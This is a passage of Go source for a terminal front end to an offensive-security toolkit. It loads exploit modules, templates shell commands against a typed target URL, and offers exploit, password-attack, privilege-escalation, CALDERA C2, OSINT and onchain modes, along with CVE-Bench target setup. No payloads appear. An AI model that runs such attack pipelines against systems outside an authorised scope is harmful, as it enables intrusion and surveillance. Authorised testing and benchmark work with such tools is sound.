				Label:       "No Runnable FIRE Commands",
				Description: "No compatible Kali commands found for this mode/group. Check runtime toolchain.",
				Mode:        "internal",
				Command:     "noop",
			},
		}
	}
	return filtered
}

func (m model) activeControlIndex() int {
	switch m.controlSection {
	case 0:
		return m.launchIdx
	case 1:
		return m.targetIdx
	case 2:
		return m.fireIdx
	default:
		return m.historyIdx
	}
}

func (m model) selectedCVETask() string {
	if len(m.cveTasks) == 0 {
		return "none detected"
	}
	idx := clamp(m.cveTaskIdx, 0, len(m.cveTasks)-1)
	return m.cveTasks[idx]
}

func (m model) selectedReplayRunLabel() string {
	if len(m.replayRuns) == 0 {
		return "none"
	}
	idx := clamp(m.replayRunIdx, 0, len(m.replayRuns)-1)
	return filepath.Base(m.replayRuns[idx])
}

func pipelineNames() []string {
	names := make([]string, 0, len(pipelineCatalog))
	for _, spec := range pipelineCatalog {
		names = append(names, spec.Name)
	}
	return names
}

func osintDeepEngines() []string {
	return []string{"bbot", "spiderfoot"}
}

func osintInputTypes() []string {
	return []string{"domain", "url", "person", "email", "username", "phone", "ip", "image", "organization", "keyword", "custom"}
}

func onchainInputTypes() []string {
	return []string{"address", "tx", "block", "contract", "repo", "bytecode", "ens", "token", "custom"}
}

type onchainNetworkProfile struct {
	Key     string
	Label   string
	ChainID int
	RPCURL  string
}

func onchainNetworkProfiles() []onchainNetworkProfile {
	return []onchainNetworkProfile{
		{Key: "eth-mainnet", Label: "Ethereum Mainnet", ChainID: 1, RPCURL: "https://ethereum-rpc.publicnode.com"},
		{Key: "eth-sepolia", Label: "Ethereum Sepolia", ChainID: 11155111, RPCURL: "https://ethereum-sepolia-rpc.publicnode.com"},
		{Key: "base-mainnet", Label: "Base Mainnet", ChainID: 8453, RPCURL: "https://base-rpc.publicnode.com"},
		{Key: "base-sepolia", Label: "Base Sepolia", ChainID: 84532, RPCURL: "https://base-sepolia-rpc.publicnode.com"},
		{Key: "polygon-mainnet", Label: "Polygon Mainnet", ChainID: 137, RPCURL: "https://polygon-bor-rpc.publicnode.com"},
		{Key: "polygon-amoy", Label: "Polygon Amoy", ChainID: 80002, RPCURL: "https://polygon-amoy-bor-rpc.publicnode.com"},
		{Key: "arbitrum-mainnet", Label: "Arbitrum One", ChainID: 42161, RPCURL: "https://arbitrum-one-rpc.publicnode.com"},
		{Key: "arbitrum-sepolia", Label: "Arbitrum Sepolia", ChainID: 421614, RPCURL: "https://arbitrum-sepolia-rpc.publicnode.com"},
		{Key: "optimism-mainnet", Label: "Optimism Mainnet", ChainID: 10, RPCURL: "https://optimism-rpc.publicnode.com"},
		{Key: "optimism-sepolia", Label: "Optimism Sepolia", ChainID: 11155420, RPCURL: "https://optimism-sepolia-rpc.publicnode.com"},
	}
}

func onchainProfileByKey(key string) onchainNetworkProfile {
	normalized := strings.ToLower(strings.TrimSpace(key))
	for _, profile := range onchainNetworkProfiles() {
		if strings.EqualFold(profile.Key, normalized) {
			return profile
		}
	}
	return onchainNetworkProfiles()[0]
}

func (m model) selectedOsintDeepEngine() string {
	engines := osintDeepEngines()
	if len(engines) == 0 {
		return "bbot"
	}
	idx := clamp(m.osintDeepIdx, 0, len(engines)-1)
	return engines[idx]
}

func (m model) selectedOsintInputType() string {
	types := osintInputTypes()
	if len(types) == 0 {
		return "domain"
	}
	idx := clamp(m.osintTargetTypeIdx, 0, len(types)-1)
	return types[idx]
}

func (m model) selectedOnchainInputType() string {
	types := onchainInputTypes()
	if len(types) == 0 {
		return "address"
	}
	idx := clamp(m.onchainTargetTypeIdx, 0, len(types)-1)
	return types[idx]
}

func (m model) selectedOnchainProfile() onchainNetworkProfile {
	return onchainProfileByKey(m.onchainNetworkInput)
}

func (m model) selectedCoopCalderaURL() string {
	value := strings.TrimSpace(m.coopCalderaURL)
	if value == "" {
		return defaultCoopCalderaURL()
	}
	return value
}

func (m model) selectedCoopCalderaAPIKey() string {
	value := strings.TrimSpace(m.coopCalderaAPIKey)
	if value == "" {
		return defaultCoopCalderaAPIKey()
	}
	return value
}

func (m model) selectedCoopOperationName() string {
	value := strings.TrimSpace(m.coopOperationName)
	if value == "" {
		return "h3retik-operation"
	}
	return value
}

func (m model) selectedCoopAgentGroup() string {
	value := strings.TrimSpace(m.coopAgentGroup)
	if value == "" {
		return "red"
	}
	return value
}

func (m model) coopCalderaEnvPrefix() string {
	return "COOP_CALDERA_URL=" + shellQuote(m.selectedCoopCalderaURL()) + " COOP_CALDERA_API_KEY=" + shellQuote(m.selectedCoopCalderaAPIKey())
}

func onchainRPCHost(raw string) string {
	parsed, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || parsed.Host == "" {
		return raw
	}
	return parsed.Host
}

func (m model) selectedPipelineName() string {
	names := pipelineNames()
	if len(names) == 0 {
		return "prelim"
	}
	idx := clamp(m.firePipelineIdx, 0, len(names)-1)
	return names[idx]
}

func pipelineByName(name string) pipelineSpec {
	for _, spec := range pipelineCatalog {
		if strings.EqualFold(spec.Name, name) {
			return spec
		}
	}
	return pipelineSpec{
		Name:    name,
		Icon:    "PL",
		Label:   strings.ToUpper(name),
		Summary: "Custom pipeline execution.",
		Stages:  []string{"Plan", "Execute", "Collect"},
		Tools:   "mixed",
		Outcome: "Pipeline run completed.",
	}
}

func loadAttackModules(root string) []attackModule {
	base := filepath.Join(root, "modules", "exploit")
	entries, err := os.ReadDir(base)
	if err != nil {
		return nil
	}
	out := make([]attackModule, 0, len(entries))
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		name := strings.ToLower(strings.TrimSpace(entry.Name()))
		if !strings.HasSuffix(name, ".json") {
			continue
		}
		raw, err := os.ReadFile(filepath.Join(base, entry.Name()))
		if err != nil {
			continue
		}
		var item attackModule
		if err := json.Unmarshal(raw, &item); err != nil {
			continue
		}
		item.ID = strings.TrimSpace(item.ID)
		item.Mode = strings.ToLower(strings.TrimSpace(item.Mode))
		item.Group = strings.TrimSpace(item.Group)
		item.Runtime = strings.ToLower(strings.TrimSpace(item.Runtime))
		item.Label = strings.TrimSpace(item.Label)
		item.Description = strings.TrimSpace(item.Description)
		item.CommandTemplate = strings.TrimSpace(item.CommandTemplate)
		if item.ID == "" || item.Label == "" || item.CommandTemplate == "" {
			continue
		}
		if item.Mode == "" {
			item.Mode = "exploit"
		}
		if item.Runtime == "" {
			item.Runtime = "kali"
		}
		if item.Group == "" {
			item.Group = "Modules"
		}
		for idx := range item.Inputs {
			item.Inputs[idx].Key = strings.TrimSpace(strings.ToLower(item.Inputs[idx].Key))
			item.Inputs[idx].Label = strings.TrimSpace(item.Inputs[idx].Label)
			item.Inputs[idx].DefaultValue = strings.TrimSpace(item.Inputs[idx].DefaultValue)
			item.Inputs[idx].InputType = strings.TrimSpace(strings.ToLower(item.Inputs[idx].InputType))
			for i := range item.Inputs[idx].Options {
				item.Inputs[idx].Options[i] = strings.TrimSpace(item.Inputs[idx].Options[i])
			}
		}
		if item.Enabled {
			out = append(out, item)
		}
	}
	sort.Slice(out, func(i, j int) bool {
		if out[i].Group == out[j].Group {
			return strings.ToLower(out[i].Label) < strings.ToLower(out[j].Label)
		}
		return strings.ToLower(out[i].Group) < strings.ToLower(out[j].Group)
	})
	return out
}

func (m model) renderModuleTemplate(template string, moduleInputs map[string]string) string {
	targetURL := strings.TrimSpace(m.effectiveExploitTargetURL())
	targetBase := strings.TrimRight(targetURL, "/")
	targetHost := targetHostFromURL(targetURL)
	dockerTarget := strings.TrimSpace(m.state.DockerTarget)
	if dockerTarget == "" {
		dockerTarget = targetURL
	}
	onchain := m.selectedOnchainProfile()
	replacer := strings.NewReplacer(
		"{{target_url}}", targetURL,
		"{{target_base}}", targetBase,
		"{{target_host}}", targetHost,
		"{{docker_target}}", dockerTarget,
		"{{osint_seed}}", strings.TrimSpace(m.osintTargetInput),
		"{{onchain_target}}", strings.TrimSpace(m.onchainTargetInput),
		"{{chain_key}}", onchain.Key,
		"{{chain_id}}", fmt.Sprintf("%d", onchain.ChainID),
	)
	rendered := replacer.Replace(template)
	for key, value := range moduleInputs {
		token := "{{input:" + strings.ToLower(strings.TrimSpace(key)) + "}}"
		rendered = strings.ReplaceAll(rendered, token, strings.TrimSpace(value))
	}
	placeholderRe := regexp.MustCompile(`\{\{input:[a-zA-Z0-9_\-]+\}\}`)
	rendered = placeholderRe.ReplaceAllString(rendered, "")
	return strings.TrimSpace(rendered)
}

func (m model) moduleToAction(mod attackModule) controlAction {
	command := m.renderModuleTemplate(mod.CommandTemplate, m.moduleInputValueMap(mod.ID))
	action := controlAction{
		Label:       "[MODULE] " + mod.Label,
		Description: valueOr(mod.Description, "User module action"),
		ActionID:    valueOr(strings.TrimSpace(mod.ActionID), strings.ToLower(mod.ID)),
		Group:       valueOr(mod.Group, "Modules"),
		Requires:    mod.Requires,
		ModuleID:    mod.ID,
		Evidence:    mod.Evidence,
	}
	switch mod.Runtime {
	case "local":
		action.Mode = "local"
		action.Command = "bash -lc " + shellQuote(command)
		action.Args = []string{"bash", "-lc", command}
	default:
		action.Mode = "kali"
		action.Command = "docker exec h3retik-kali bash -lc " + shellQuote(command)
		action.KaliShell = command
	}
	return action
}

func (m model) moduleInputStorageKey(moduleID, inputKey string) string {
	return strings.ToLower(strings.TrimSpace(moduleID)) + "::" + strings.ToLower(strings.TrimSpace(inputKey))
}

func (m model) moduleInputValueMap(moduleID string) map[string]string {
	result := map[string]string{}
	mod, ok := m.attackModuleByID(moduleID)
	if !ok {
		return result
	}
	for _, input := range mod.Inputs {
		key := strings.TrimSpace(input.Key)
		if key == "" {
			continue
		}
		value := strings.TrimSpace(input.DefaultValue)
		if stored := strings.TrimSpace(m.moduleInputValues[m.moduleInputStorageKey(moduleID, key)]); stored != "" {
			value = stored
		}
		if value != "" {
			result[key] = value
		}
	}
	return result
}

func moduleInputByKey(inputs []attackModuleInput, key string) (attackModuleInput, bool) {
	needle := strings.ToLower(strings.TrimSpace(key))
	for _, input := range inputs {
		if strings.ToLower(strings.TrimSpace(input.Key)) == needle {
			return input, true
		}
	}
	return attackModuleInput{}, false
}

func (m model) attackModuleByID(moduleID string) (attackModule, bool) {
	needle := strings.ToLower(strings.TrimSpace(moduleID))
	for _, mod := range m.attackModules {
		if strings.EqualFold(strings.TrimSpace(mod.ID), needle) {
			return mod, true
		}
	}
	return attackModule{}, false
}

func moduleInputDisplayLabel(input attackModuleInput) string {
	name := strings.TrimSpace(input.Key)
	if strings.TrimSpace(input.Label) != "" {
		name = strings.TrimSpace(input.Label)
	}
	kind := strings.TrimSpace(strings.ToLower(input.InputType))
	if kind == "" || kind == "text" {
		return strings.ToUpper(name)
	}
	return strings.ToUpper(name) + " (" + kind + ")"
}

func validateModuleInputValue(input attackModuleInput, raw string) (string, error) {
	value := strings.TrimSpace(raw)
	if value == "" {
		return "", nil
	}
	switch strings.TrimSpace(strings.ToLower(input.InputType)) {
	case "", "text":
		return value, nil
	case "bool", "boolean":
		v := strings.ToLower(value)
		switch v {
		case "1", "true", "yes", "y", "on":
			return "true", nil
		case "0", "false", "no", "n", "off":
			return "false", nil
		default:
			return "", fmt.Errorf("expected bool (true/false)")
		}
	case "int", "integer":
		parsed, err := strconv.Atoi(value)
		if err != nil {
			return "", fmt.Errorf("expected integer")
		}
		if input.Min != nil && parsed < *input.Min {
			return "", fmt.Errorf("must be >= %d", *input.Min)
		}
		if input.Max != nil && parsed > *input.Max {
			return "", fmt.Errorf("must be <= %d", *input.Max)
		}
		return fmt.Sprintf("%d", parsed), nil
	case "select":
		options := make([]string, 0, len(input.Options))
		for _, option := range input.Options {
			if strings.TrimSpace(option) != "" {
				options = append(options, strings.TrimSpace(option))
			}
		}
		if len(options) == 0 {
			return value, nil
		}
		for _, option := range options {
			if strings.EqualFold(option, value) {
				return option, nil
			}
		}
		return "", fmt.Errorf("must be one of: %s", strings.Join(options, ", "))
	default:
		return value, nil
	}
}

func pipelineRequirements(name string) []string {
	switch strings.ToLower(strings.TrimSpace(name)) {
	case "initial-exploit":
		return []string{"recon"}
	case "post-enum":
		return []string{"breach"}
	case "password-attacks":
		return []string{"access"}
	case "privesc":
		return []string{"access"}
	case "full-escalation":
		return []string{"breach"}
	case "full-chain":
		return []string{"recon", "breach"}
	default:
		return nil
	}
}

func pipelineNamesForFireGroup(group string) []string {
	group = strings.ToLower(strings.TrimSpace(group))
	mapping := map[string][]string{
		"recon":     {"prelim", "surface-map", "web-enum", "vuln-sweep", "api-probe"},
		"surface":   {"surface-map", "web-enum", "vuln-sweep", "api-probe"},
		"exploit":   {"api-probe", "initial-exploit", "vuln-sweep"},
		"access":    {"password-attacks", "initial-exploit", "api-probe"},
		"privilege": {"post-enum", "password-attacks", "privesc", "full-escalation"},
		"objective": {"full-chain", "initial-exploit", "privesc"},
	}
	names, ok := mapping[group]
	if !ok || len(names) == 0 {
		return pipelineNames()
	}
	available := map[string]bool{}
	for _, name := range pipelineNames() {
		available[strings.ToLower(strings.TrimSpace(name))] = true
	}
	filtered := make([]string, 0, len(names))
	for _, name := range names {
		if available[strings.ToLower(strings.TrimSpace(name))] {
			filtered = append(filtered, name)
		}
	}
	if len(filtered) == 0 {
		return pipelineNames()
	}
	return filtered
}

func selectedPipelineLabel(name string) string {
	spec := pipelineByName(name)
	return spec.Icon + " " + strings.ToUpper(spec.Name)
}

func renderSelectedPipelineGuide(name string, width int) string {
	spec := pipelineByName(name)
	lines := []string{
		metricLine("selected", selectedPipelineLabel(name)+" ("+spec.Label+")"),
		wrap(spec.Summary, max(24, width)),
		metricLine("stages", strings.Join(spec.Stages, " -> ")),
		metricLine("tools", spec.Tools),
		metricLine("outcome", spec.Outcome),
	}
	return strings.Join(lines, "\n")
}

func renderPipelineLegend(selected string, width int) string {
	lines := make([]string, 0, len(pipelineCatalog)+1)
	for _, spec := range pipelineCatalog {
		prefix := "  "
		style := lipgloss.NewStyle().Foreground(lipgloss.Color("245"))
		if strings.EqualFold(spec.Name, selected) {
			prefix = "▸ "
			style = lipgloss.NewStyle().Foreground(lipgloss.Color("230")).Background(lipgloss.Color("57")).Bold(true)
		}
		head := fmt.Sprintf("%s%s %s", prefix, spec.Icon, strings.ToUpper(spec.Name))
		lines = append(lines, style.Render(head))
		lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("242")).Render(wrap(spec.Label+" :: "+spec.Summary, max(24, width-2))))
	}
	lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("use ,/. in FIRE pane to cycle exploit groups"))
	return strings.Join(lines, "\n")
}

func renderFireModeGuide(mode, exploitPipeline, deepEngine string, width int) string {
	if strings.EqualFold(mode, "coop") {
		lines := []string{
			metricLine("mode", "CO-OP (CALDERA C2)"),
			metricLine("chain", "Caldera up -> status -> agents -> operations -> report"),
			metricLine("tutorial", "CTRL/TARGET sets URL/key/op/group; CTRL/FIRE executes C2 flows"),
			wrap("Use p in CTRL/FIRE to switch mode. Co-op lane is telemetry-first and writes artifacts under artifacts/coop.", max(24, width)),
		}
		return strings.Join(lines, "\n")
	}
	if strings.EqualFold(mode, "onchain") {
		lines := []string{
			metricLine("mode", "ONCHAIN"),
			metricLine("chain", "RPC Catalog -> RPC Check -> Address Flow + 4D Graph -> Auditors/Fuzzers"),
			metricLine("network", "set in CTRL target pane (mainnet/testnet)"),
			wrap("Use c in CTRL/FIRE to switch mode. Use CTRL/TARGET actions to update target and chain profile.", max(24, width)),
		}
		return strings.Join(lines, "\n")
	}
	if strings.EqualFold(mode, "osint") {
		lines := []string{
			metricLine("mode", "OSINT"),
			metricLine("chain", "theHarvester -> BBOT/SpiderFoot -> Recon-ng -> reNgine"),
			metricLine("preferred deep", strings.ToUpper(deepEngine)),
			wrap("Use o in CTRL/FIRE for OSINT mode, c for ONCHAIN, and ,/. to cycle preferred deep engine.", max(24, width)),
		}
		return strings.Join(lines, "\n")
	}
	lines := []string{
		renderSelectedPipelineGuide(exploitPipeline, width),
		metricLine("exploit fire", "group-driven menu with readiness + done states"),
	}
	return strings.Join(lines, "\n")
}

func renderFireModeLegend(mode, exploitPipeline, deepEngine string, width int) string {
	if strings.EqualFold(mode, "coop") {
		lines := []string{
			"▸ [COOP] Guided Quickstart",
			"  [COOP] Launch + Status + API health",
			"  [COOP] Agents + Operations + Report",
			"  use g to toggle CO-OP/EXPLOIT fire mode",
		}
		return wrap(strings.Join(lines, " | "), width)
	}
	if strings.EqualFold(mode, "onchain") {
		lines := []string{
			"▸ [ONCHAIN] RPC Catalog + RPC Check",
			"  [ONCHAIN] Address Flow Snapshot + 4D Correlation Graph",
			"  [ONCHAIN] Slither + Mythril audits",
			"  [ONCHAIN] Foundry + Echidna + Medusa + Halmos",
			"  use c to toggle ONCHAIN/EXPLOIT fire mode",
		}
		return wrap(strings.Join(lines, " | "), width)
	}
	if strings.EqualFold(mode, "osint") {
		lines := []string{
			"▸ [OSINT] 1/5 Seed :: theHarvester",
			"  [OSINT] 2/5 Deep :: preferred engine",
			"  [OSINT] 3/5 Recon-ng Custom Modules",
			"  [OSINT] 4/5 reNgine Runtime/API Check",
			"  [OSINT] 5/5 Stack Check",
			"  preferred deep :: " + strings.ToUpper(deepEngine),
			"  use o for OSINT and c for ONCHAIN fire mode",
		}
		return wrap(strings.Join(lines, " | "), width)
	}
	return renderPipelineLegend(exploitPipeline, width)
}

func (m *model) syncCVETaskSelection() {
	if len(m.cveTasks) == 0 {
		m.cveTaskIdx = 0
		return
	}
	if strings.EqualFold(strings.TrimSpace(m.state.TargetKind), "cve-bench") {
		targetID := strings.ToUpper(strings.TrimSpace(m.state.TargetID))
		if targetID != "" {
			for i, task := range m.cveTasks {
				if strings.EqualFold(task, targetID) {
					m.cveTaskIdx = i
					return
				}
			}
		}
	}
	m.cveTaskIdx = clamp(m.cveTaskIdx, 0, len(m.cveTasks)-1)
}

func (m *model) syncReplaySelection() {
	if len(m.replayRuns) == 0 {
		m.replayRunIdx = 0
		return
	}
	for i, path := range m.replayRuns {
		if filepath.Clean(path) == filepath.Clean(m.telemetryDir) {
			m.replayRunIdx = i
			return
		}
	}
	m.replayRunIdx = clamp(m.replayRunIdx, 0, len(m.replayRuns)-1)
}

func (m model) launchActions() []controlAction {
	activeTarget := strings.TrimSpace(m.state.TargetURL)
	mode := strings.ToLower(strings.TrimSpace(m.fireMode))
	switch mode {
	case "coop":
		envPrefix := m.coopCalderaEnvPrefix()
		return []controlAction{
			{
				Label:       "Start Kali Runtime",
				Description: "Ensure Kali runtime is up for co-op/C2 tooling.",
				Mode:        "local",
				Command:     "docker compose up -d kali",
				Args:        []string{"docker", "compose", "up", "-d", "kali"},
			},
			{
				Label:       "[GUIDED] Co-op Quickstart",
				Description: "Show compact guided flow for first-use co-op operators.",
				Mode:        "internal",
				Command:     "coop:tutorial:show",
			},
			{
				Label:       "CO-OP Stack Check",
				Description: "Verify CALDERA runtime wrappers in Kali.",
				Mode:        "kali",
				Command:     kaliExecCommand(envPrefix + " coop-caldera-check"),
				KaliShell:   envPrefix + " coop-caldera-check",
			},
			{
				Label:       "CO-OP Start CALDERA C2",
				Description: "Start CALDERA server headlessly in Kali for co-op operations.",
				Mode:        "kali",
				Command:     kaliExecCommand(envPrefix + " coop-caldera-up"),
				KaliShell:   envPrefix + " coop-caldera-up",
			},
			{
				Label:       "CO-OP C2 Status",
				Description: "Show CALDERA process/API status and quick telemetry.",
				Mode:        "kali",
				Command:     kaliExecCommand(envPrefix + " coop-caldera-status"),
				KaliShell:   envPrefix + " coop-caldera-status",
			},
		}
	case "osint":
		return []controlAction{
			{
				Label:       "Start Kali Runtime",
				Description: "Ensure Kali service runtime is up for OSINT tooling.",
				Mode:        "local",
				Command:     "docker compose up -d kali",
				Args:        []string{"docker", "compose", "up", "-d", "kali"},
			},
			{
				Label:       "OSINT Stack Check",
				Description: "Verify OSINT wrappers in Kali before investigation.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"osint-stack-check\"",
				KaliShell:   "osint-stack-check",
			},
			{
				Label:       "OSINT Artifact Index",
				Description: "List collected OSINT artifacts.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort\"",
				KaliShell:   "find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort",
			},
		}
	case "onchain":
		return []controlAction{
			{
				Label:       "Start Kali Runtime",
				Description: "Ensure Kali service runtime is up for onchain tooling.",
				Mode:        "local",
				Command:     "docker compose up -d kali",
				Args:        []string{"docker", "compose", "up", "-d", "kali"},
			},
			{
				Label:       "ONCHAIN Stack Check",
				Description: "Verify onchain wrappers and analyzers in Kali.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"onchain-stack-check\"",
				KaliShell:   "onchain-stack-check",
			},
			{
				Label:       "ONCHAIN RPC Catalog",
				Description: "Display available public/testnet RPC profiles.",
				Mode:        "kali",
				Command:     "docker exec h3retik-kali bash -lc \"onchain-rpc-catalog\"",
				KaliShell:   "onchain-rpc-catalog",
			},
		}
	}
	actions := []controlAction{
		{
			Label:       "Start Kali Runtime",
			Description: "Ensure Kali runtime is available for exploit tooling.",
			Mode:        "local",
			Command:     "docker compose up -d kali",
			Args:        []string{"docker", "compose", "up", "-d", "kali"},
		},
	}
	if activeTarget == "" {
		actions = append(actions, controlAction{
			Label:       "Target Required",
			Description: "Set active target URL in CTRL TARGET before launch scans.",
			Mode:        "internal",
			Command:     "target:manual-url",
		})
		return actions
	}
	actions = append(actions,
		controlAction{
			Label:       "Target State Info",
			Description: "Show currently selected target profile and runtime state.",
			Mode:        "local",
			Command:     "python3 ./scripts/targetctl.py info --kind custom --url " + activeTarget,
			Args:        []string{"python3", "./scripts/targetctl.py", "info", "--kind", "custom", "--url", activeTarget},
		},
		controlAction{
			Label:       "Run Security Pipeline (Standard)",
			Description: "Run modular standard-depth scan pipeline against active target URL and archive run telemetry.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + activeTarget + " --profile standard",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", activeTarget, "--profile", "standard"},
		},
	)
	return actions
}

func (m model) targetActions() []controlAction {
	runtimeActions := []controlAction{
		{
			Label:       "KALI Runtime Container (Type)",
			Description: "Set docker container name used for all Kali-mode execution.",
			Mode:        "internal",
			Command:     "target:manual-kali-container",
		},
		{
			Label:       "KALI Runtime Image (Type)",
			Description: "Set Kali image tag used by compose-based runtime startup.",
			Mode:        "internal",
			Command:     "target:manual-kali-image",
		},
		{
			Label:       "KALI Runtime Profile",
			Description: "container=" + kaliContainerName() + " image=" + kaliImageName(),
			Mode:        "internal",
			Command:     "noop",
		},
	}
	if strings.EqualFold(m.fireMode, "coop") {
		return append(runtimeActions, []controlAction{
			{
				Label:       "CO-OP Caldera URL (Type)",
				Description: "Set CALDERA API/UI base URL used by co-op C2 commands.",
				Mode:        "internal",
				Command:     "target:manual-coop-url",
			},
			{
				Label:       "CO-OP Caldera API Key (Type)",
				Description: "Set CALDERA API key (KEY header).",
				Mode:        "internal",
				Command:     "target:manual-coop-key",
			},
			{
				Label:       "CO-OP Operation Name (Type)",
				Description: "Set operation identifier for operation-oriented actions.",
				Mode:        "internal",
				Command:     "target:manual-coop-operation",
			},
			{
				Label:       "CO-OP Agent Group (Type)",
				Description: "Set host/agent group focus used in report context.",
				Mode:        "internal",
				Command:     "target:manual-coop-agent-group",
			},
			{
				Label:       "CO-OP Profile: " + truncate(m.selectedCoopCalderaURL(), 44),
				Description: "Active C2 endpoint and operation profile.",
				Mode:        "internal",
				Command:     "noop",
			},
		}...)
	}
	if strings.EqualFold(m.fireMode, "osint") {
		return append(runtimeActions, []controlAction{
			{
				Label:       "OSINT Input: Edit Seed (Type)",
				Description: "Type investigation seed (domain/url/person/email/username/phone/ip).",
				Mode:        "internal",
				Command:     "target:manual-osint",
			},
			{
				Label:       "OSINT Input Type: Cycle",
				Description: "Cycle seed type to align collection strategy.",
				Mode:        "internal",
				Command:     "target:osint-type:next",
			},
			{
				Label:       "OSINT Seed: Derive From Active URL",
				Description: "Set seed from the current active target host.",
				Mode:        "internal",
				Command:     "target:osint-seed-from-url",
			},
		}...)
	}
	if strings.EqualFold(m.fireMode, "onchain") {
		profile := m.selectedOnchainProfile()
		return append(runtimeActions, []controlAction{
			{
				Label:       "ONCHAIN Input: Edit Target (Type)",
				Description: "Type address/tx/block/contract/repo seed for onchain investigation.",
				Mode:        "internal",
				Command:     "target:manual-onchain",
			},
			{
				Label:       "ONCHAIN Input Type: Cycle",
				Description: "Cycle onchain input type profile.",
				Mode:        "internal",
				Command:     "target:onchain-type:next",
			},
			{
				Label:       "ONCHAIN Network: Cycle",
				Description: "Cycle to next chain profile (chain id + public RPC).",
				Mode:        "internal",
				Command:     "target:onchain-network:next",
			},
			{
				Label:       "ONCHAIN Profile: " + profile.Label,
				Description: fmt.Sprintf("Active chain %d via %s", profile.ChainID, onchainRPCHost(profile.RPCURL)),
				Mode:        "internal",
				Command:     "noop",
			},
		}...)
	}

	actions := append([]controlAction{}, runtimeActions...)
	activeTarget := strings.TrimSpace(m.state.TargetURL)
	actions = append(actions, controlAction{
		Label:       "Set Target: Custom URL (Type)",
		Description: "Type any blackbox URL directly in TUI, then press Enter to apply.",
		Mode:        "internal",
		Command:     "target:manual-url",
	})
	if activeTarget != "" {
		actions = append(actions, controlAction{
			Label:       "Set Target: Active Custom URL",
			Description: "Write current target URL into target profile state as custom scope.",
			Mode:        "local",
			Command:     "python3 ./scripts/targetctl.py set --kind custom --url " + activeTarget,
			Args:        []string{"python3", "./scripts/targetctl.py", "set", "--kind", "custom", "--url", activeTarget},
		})
	} else {
		actions = append(actions, controlAction{
			Label:       "Set Target: Active Custom URL (Unavailable)",
			Description: "No active target URL in state. Type one first (suggested: " + defaultTargetSuggestion() + ").",
			Mode:        "internal",
			Command:     "target:manual-url",
		})
	}
	innerTargets := exploitInnerTargets(findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"), m.state.TargetURL)
	selectedInner := ""
	if len(innerTargets) > 0 {
		selectedInner = innerTargets[clampWrap(m.exploitInnerTargetIdx, len(innerTargets))]
	}
	fireTarget := strings.TrimSpace(m.effectiveExploitTargetURL())
	actions = append(actions,
		controlAction{
			Label:       fmt.Sprintf("[INNER] Auto-Mapped Endpoints: %d", len(innerTargets)),
			Description: "Auto-generated from discovered endpoint telemetry and loot signals.",
			Mode:        "internal",
			Command:     "noop",
		},
		controlAction{
			Label:       "[INNER] Next Endpoint",
			Description: "Cycle to next mapped inner endpoint target.",
			Mode:        "internal",
			Command:     "target:inner:next",
		},
		controlAction{
			Label:       "[INNER] Previous Endpoint",
			Description: "Cycle to previous mapped inner endpoint target.",
			Mode:        "internal",
			Command:     "target:inner:prev",
		},
		controlAction{
			Label:       "[INNER] Endpoint: Manual (Type)",
			Description: "Type any endpoint URL/path and set it as active inner target.",
			Mode:        "internal",
			Command:     "target:inner:manual",
		},
		controlAction{
			Label:       "[INNER] Apply Selected To FIRE Target",
			Description: "Use current mapped endpoint as active FIRE target for exploit commands.",
			Mode:        "internal",
			Command:     "target:inner:apply",
		},
		controlAction{
			Label:       "[INNER] Clear FIRE Target Override",
			Description: "Revert exploit FIRE target override back to active target URL.",
			Mode:        "internal",
			Command:     "target:inner:clear",
		},
		controlAction{
			Label:       "[INNER] Selected: " + truncate(valueOr(selectedInner, "none"), 52),
			Description: "Currently selected mapped endpoint candidate.",
			Mode:        "internal",
			Command:     "noop",
		},
		controlAction{
			Label:       "[INNER] FIRE Target: " + truncate(valueOr(fireTarget, valueOr(activeTarget, "unset")), 52),
			Description: "Effective exploit command target currently in use.",
			Mode:        "internal",
			Command:     "noop",
		},
	)
	task := m.selectedCVETask()
	if task == "none detected" {
		actions = append(actions,
			controlAction{
				Label:       "Set Target: CVE-Bench (No Tasks Found)",
				Description: "No CVE metadata was detected under external/cve-bench/src/critical/metadata.",
				Mode:        "local",
				Command:     "",
				Args:        nil,
			},
			controlAction{
				Label:       "Start Target: CVE-Bench (No Tasks Found)",
				Description: "No CVE metadata was detected under external/cve-bench/src/critical/metadata.",
				Mode:        "local",
				Command:     "",
				Args:        nil,
			},
		)
		return actions
	}
	actions = append(actions,
		controlAction{
			Label:       "Set Target: CVE-Bench " + task,
			Description: "Switch active target to selected CVE-Bench task.",
			Mode:        "local",
			Command:     "python3 ./scripts/targetctl.py set --kind cve-bench --task " + task,
			Args:        []string{"python3", "./scripts/targetctl.py", "set", "--kind", "cve-bench", "--task", task},
		},
		controlAction{
			Label:       "Start Target: CVE-Bench " + task,
			Description: "Start selected CVE-Bench task and set it as active target.",
			Mode:        "local",
			Command:     "python3 ./scripts/targetctl.py start --kind cve-bench --task " + task,
			Args:        []string{"python3", "./scripts/targetctl.py", "start", "--kind", "cve-bench", "--task", task},
		},
		controlAction{
			Label:       "Show Target Info: CVE-Bench " + task,
			Description: "Print the headless target metadata for the selected CVE task.",
			Mode:        "local",
			Command:     "python3 ./scripts/targetctl.py info --kind cve-bench --task " + task,
			Args:        []string{"python3", "./scripts/targetctl.py", "info", "--kind", "cve-bench", "--task", task},
		},
	)
	return actions
}

func (m model) fireActions() []controlAction {
	if strings.EqualFold(m.fireMode, "coop") {
		return m.coopFireActions()
	}
	if strings.EqualFold(m.fireMode, "onchain") {
		return m.onchainFireActions()
	}
	if strings.EqualFold(m.fireMode, "osint") {
		return m.osintFireActions()
	}
	return m.exploitFireActions()
}

func (m model) coopFireActions() []controlAction {
	envPrefix := m.coopCalderaEnvPrefix()
	op := m.selectedCoopOperationName()
	group := m.selectedCoopAgentGroup()
	actions := m.customFireActions("coop")
	actions = append(actions,
		controlAction{
			Label:       "[COOP] Guided Quickstart",
			Description: "Render co-op tutorial card in CTRL result area.",
			Mode:        "internal",
